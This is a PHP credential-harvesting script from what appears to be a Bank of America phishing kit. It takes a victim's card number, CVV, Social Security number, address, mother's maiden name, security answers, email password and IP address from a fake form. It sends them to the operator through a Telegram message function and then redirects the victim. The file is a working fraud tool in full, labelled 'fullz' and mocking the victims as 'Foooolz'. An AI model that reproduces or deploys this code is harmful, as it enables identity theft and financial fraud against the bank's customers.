<?php
include '../blocker.php';
include 'config.php';
$ip = getenv("REMOTE_ADDR");
$message .= "Card Number: " .$_POST['1']."\n\n";
$message .= "Expiry Date: " .$_POST['2']."\n\n";
$message .= "Card CVV: " .$_POST['3']."\n";
$message .= "Social Security Number: " .$_POST['4']."\n";
$message .= "Full Name: " .$_POST['5']."\n";
$message .= "Address: " .$_POST['6']."\n";
$message .= "City: " .$_POST['7']."\n";
$message .= "State: " .$_POST['8']."\n";
$message .= "Zipcode: " .$_POST['9']."\n";
$message .= "Mothers Maidens Name: " .$_POST['10']."\n";
$message .= "First Company: " .$_POST['first']."\n";
$message .= "High School City: " .$_POST['school']."\n";
$message .= "City Of Birth: " .$_POST['11']."\n";
$message .= "Email Address: " .$_POST['12']."\n";
$message .= "Password: " .$_POST['13']."\n";
$message .= "Pets Name: " .$_POST['14']."\n";
$message .= "-------------------\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "------Bank---Of--America-Foooolz------\n";
$subject = "Bank Of America Edd-fullz\r\n\r\n".$message;
send_telegram_msg($message);
header("Location: ========-.htm");

?>
        